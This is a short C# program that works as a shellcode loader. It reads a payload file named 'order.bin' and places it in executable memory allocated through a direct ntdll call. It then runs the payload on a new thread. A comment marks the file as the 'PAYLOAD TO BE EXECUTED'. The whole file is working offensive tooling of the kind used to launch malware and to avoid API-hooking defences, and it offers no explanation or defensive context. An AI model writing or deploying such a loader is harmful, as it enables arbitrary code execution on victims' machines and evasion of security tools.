using System;
using System.IO;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern uint NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ulong ZeroBits,
        ref ulong RegionSize,
        uint AllocationType,
        uint Protect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint WaitForSingleObject(
        IntPtr hHandle,
        uint dwMilliseconds
    );

    static void Main(string[] args)
    {
        // PAYLOAD TO BE EXECUTED !
        string filePath = "order.bin";

        byte[] shellcode = LoadShellcode(filePath);
        if (shellcode == null)
        {
            Console.WriteLine("Failed to load shellcode.");
            return;
        }

        IntPtr baseAddress = IntPtr.Zero;
        ulong regionSize = (ulong)shellcode.Length;
        IntPtr processHandle = (IntPtr)(-1);

        uint allocationResult = NtAllocateVirtualMemory(
            processHandle,
            ref baseAddress,
            0,
            ref regionSize,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x40    // PAGE_EXECUTE_READWRITE
        );

        if (allocationResult != 0)
        {
            Console.WriteLine("Failed to allocate memory.");
            return;
        }

        Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

        IntPtr threadHandle = CreateThread(
            IntPtr.Zero,
            0,
            baseAddress,
            IntPtr.Zero,
            0,
            IntPtr.Zero
        );

        if (threadHandle == IntPtr.Zero)
        {
            Console.WriteLine("Failed to create thread.");
            return;
        }

        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
    }

    private static byte[] LoadShellcode(string filePath)
    {
        try
        {
            return File.ReadAllBytes(filePath);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error loading shellcode: " + ex.Message);
            return null;
        }
    }
}
